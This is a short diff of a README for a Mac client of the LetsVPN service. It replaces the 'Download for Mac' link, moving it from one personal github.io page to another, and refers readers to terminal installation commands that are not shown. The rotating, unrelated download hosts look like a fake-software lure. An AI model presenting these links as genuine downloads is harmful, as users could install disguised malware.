@@ -3,7 +3,7 @@
 
 LetsVPN for Mac is a fast and secure VPN client that helps you protect your online privacy and access global content without restrictions 🌍. Follow the installation guide below to easily set up LetsVPN on your macOS device.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for-Mac-blue?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/letsvpn)
+[![Download for Mac](https://img.shields.io/badge/Download%20for-Mac-blue?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/letsvpn)
 
 If the download button does not work, please follow the installation instructions below using terminal commands.
 
